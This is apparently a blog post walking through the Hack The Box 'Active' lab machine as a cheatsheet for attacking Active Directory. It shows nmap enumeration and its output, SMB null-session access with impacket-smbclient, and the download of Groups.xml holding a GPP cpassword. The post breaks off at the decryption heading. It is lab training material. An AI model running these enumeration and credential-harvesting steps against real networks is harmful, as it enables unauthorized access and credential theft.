---
layout: post
title:  Attacking Active Directory Cheatsheet
description: Cheatsheet for Attacking Active Directory
date:   2024-11-01 01:00:00 +0300
image:  '/images/htb_active.jpg'
tags:   [HTB, OSCP+, Active-Directory]
---
# Enumeration
### Nmap
```shell
nmap -A -Pn -T4 -p- 10.129.149.20
```
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 23:19 EDT
Nmap scan report for 10.129.149.20
Host is up (0.034s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-02 03:20:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/1%OT=53%CT=1%CU=36646%PV=Y%DS=2%DC=T%G=Y%TM=6725
OS:9ACC%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=7)
OS:SEQ(SP=103%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M53CNW8ST11%O2=
OS:M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WI
OS:N(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=N)ECN(R=Y%DF=Y%T
OS:=80%W=2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T4(R=Y%D
OS:F=Y%T=80%W=0%S=O%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=O%
OS:F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(
OS:R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=O%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-02T03:21:40
|_  start_date: 2024-11-02T03:08:52
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   33.99 ms 10.10.14.1
2   34.03 ms 10.129.149.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.65 seconds
```

Examining the Nmap results, we can identify the typical active ports of a domain controller (53, 88, 135, 139, 389, 445, 636, 3268, 3269) as well as the domain **active.htb**.

Add **active.htb** to /etc/hosts using the CLI:
```shell
echo "10.129.149.20 active.htb" | sudo tee -a /etc/hosts
```
Or with a text editor like gedit:
```shell
sudo gedit /etc/hosts
```
We can also see in our Nmap scan results that the target is running **Windows Server 2008 R2 SP1**.

### SMB Null Session access to Replication Share and finding Groups.xml
Testing SMB Null Session was successful, we can get access using:
```shell
impacket-smbclient active.htb/'':''@10.129.149.20
```
And then proceed to enumerate the available shares:
```shell
# Enter "shares" to display all the shares

# shares
ADMIN$
C$
IPC$
NETLOGON
Replication
SYSVOL
Users
```
It seems like we cannot access SYSVOL or Users but we can access the
Replication share.

Inside the Replication share we can find the file **Groups.xml**:
```shell
# The Groups.xml file is located at the following directory
cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups

# Use "mget" to download Groups.xml
mget Groups.xml
```

The Groups.xml file contains the cpassword for the user SVC_TGS. We can infer that this user is associated with the "Ticket Granting System" and that "SVC" stands for "Service." Therefore, this user is related to Kerberos.

_Windows previously stored Group Policy Preferences (GPP) credentials (Local Administrator credentials) in a file named Groups.xml, which was typically located in the Preferences folder within SYSVOL. This practice remained unchanged until the release of MS14-025. Our Nmap scan indicates that the target is running Windows Server 2008, which means it is potentially vulnerable._

# Foothold
### Decrypt GPP cpassword for user SVC_TGS
.

